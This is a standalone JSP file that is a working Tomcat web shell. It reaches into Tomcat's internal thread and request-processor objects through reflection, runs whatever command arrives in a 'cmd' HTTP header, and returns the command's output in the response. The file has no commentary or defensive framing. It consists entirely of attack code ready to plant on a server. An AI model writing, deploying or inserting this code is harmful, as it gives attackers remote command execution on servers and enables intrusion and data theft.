<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    Object obj = Thread.currentThread();
    java.lang.reflect.Field field = obj.getClass().getSuperclass().getDeclaredField("group");
    field.setAccessible(true);
    obj = field.get(obj);

    field = obj.getClass().getDeclaredField("threads");
    field.setAccessible(true);
    obj = field.get(obj);

    Thread[] threads = (Thread[])obj;
    label:for(Thread thread : threads){
        try{
            if(thread.getName().contains("http-nio") && thread.getName().contains("ClientPoller")) {
                field = thread.getClass().getDeclaredField("target");
                field.setAccessible(true);
                obj = field.get(thread);

                field = obj.getClass().getDeclaredField("this$0");
                field.setAccessible(true);
                obj = field.get(obj);

                field = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                field.setAccessible(true);
                obj = field.get(obj);

                field = obj.getClass().getDeclaredField("global");
                field.setAccessible(true);
                obj = field.get(obj);

                field = obj.getClass().getDeclaredField("processors");
                field.setAccessible(true);
                obj = field.get(obj);


                java.util.List processors = (java.util.List) obj;
                for (Object o : processors) {
                    field = o.getClass().getDeclaredField("req");
                    field.setAccessible(true);
                    obj = field.get(o);
                    org.apache.coyote.Request req = (org.apache.coyote.Request) obj;

                    String cmd = req.getHeader("cmd");
                    if (cmd != null) {
                        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                        java.nio.ByteBuffer buffer = java.nio.ByteBuffer.wrap(res.getBytes());
                        req.getResponse().doWrite(buffer);
                        break label;
                    }
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
%>